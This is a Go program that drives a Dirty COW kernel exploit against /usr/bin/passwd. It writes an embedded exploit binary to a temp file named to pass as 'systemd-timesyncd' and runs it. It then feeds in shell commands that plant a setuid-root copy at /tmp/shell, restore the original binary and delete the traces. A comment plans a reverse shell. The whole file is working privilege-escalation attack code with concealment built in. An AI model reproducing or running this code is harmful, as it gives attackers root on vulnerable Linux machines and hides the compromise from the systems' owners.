package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
)

const ShellPath = "/tmp/shell"

func main() {
	path := flag.String("file", "/usr/bin/passwd", "File to pwn")
	flag.Parse()

	if *path == "" {
		flag.Usage()
		os.Exit(1)
	}

	orig, err := ioutil.ReadFile(*path)
	if err != nil {
		log.Fatalf("Failed to read original file: %s", err)
	}

	mkTemp := func() *os.File {
		f, err := ioutil.TempFile("", "systemd-timesyncd")
		if err != nil {
			log.Fatalf("Failed to create temp file: %s", err)
		}
		return f
	}

	bkp := mkTemp()
	_, err = bkp.Write(orig)
	if err != nil {
		log.Fatalf("Failed to backup %s: %s", *path, err)
	}

	if err = bkp.Close(); err != nil {
		log.Fatalf("Failed to close backup file at %s: %s", bkp.Name(), err)
	}

	cow := mkTemp()
	_, err = cow.Write(DirtyCow)
	if err != nil {
		log.Fatalf("Failed write exploit to %s: %s", cow.Name(), err)
	}

	if err = cow.Chmod(0755); err != nil {
		log.Fatalf("Failed chmod 0755 %s: %s", cow.Name(), err)
	}

	if err = cow.Close(); err != nil {
		log.Fatalf("Failed to close expoit")
	}

	out, err := exec.Command(cow.Name(), *path).CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to pwn %s: %s
Output: %s`, *path, err, string(out))
	}

	cmd := exec.Command(*path)

	// TODO: install reverse shell
	cmd.Stdin = bytes.NewBuffer([]byte(fmt.Sprintf(`echo 0 > /proc/sys/vm/dirty_writeback_centisecs
cp %s %s
chmod 4755 %s
cat %s > %s`,
		*path, ShellPath,
		ShellPath,
		bkp.Name(), *path,
	)))

	out, err = cmd.CombinedOutput()
	if err != nil {
		log.Fatalf(`Failed to infect machine: %s
Output: %s`, err, string(out))
	}

	if err = os.Remove(cow.Name()); err != nil {
		log.Fatalf("Failed to remove exploit from %s: %s", cow.Name(), err)
	}

	if err = os.Remove(bkp.Name()); err != nil {
		log.Fatalf("Failed to remove backup from %s: %s", bkp.Name(), err)
	}
}
